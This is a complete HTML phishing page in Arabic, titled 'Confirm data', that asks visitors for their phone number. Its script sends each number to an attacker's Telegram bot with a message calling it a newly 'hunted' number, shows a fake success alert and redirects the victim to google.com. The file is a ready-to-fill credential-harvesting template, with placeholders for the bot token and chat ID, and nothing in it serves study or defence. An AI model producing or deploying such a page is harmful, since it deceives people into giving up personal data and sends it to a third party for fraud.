<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تأكيد البيانات</title>
</head>
<body style="background: #111; color: #fff; text-align: center; padding-top: 50px;">
    <h2>أدخل رقم هاتفك للمتابعة</h2>
    <input type="tel" id="phone" placeholder="010xxxxxxxx" style="padding: 10px; font-size: 16px;"><br><br>
    <button onclick="sendPhone()" style="padding: 10px 20px; background: red; color: white; border: none; cursor: pointer;">إرسال</button>

    <script>
        function sendPhone() {
            var phone = document.getElementById('phone').value;
            var botToken = 'YOUR_BOT_TOKEN';
            var chatId = 'YOUR_CHAT_ID';
            var text = '📥 تم صيد رقم جديد: ' + phone;

            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(text))
            .then(response => {
                alert('تم بنجاح!');
                window.location.href = 'https://google.com'; // تحويله لصفحة أخرى بعد الإرسال
            });
        }
    </script>
</body>
</html>
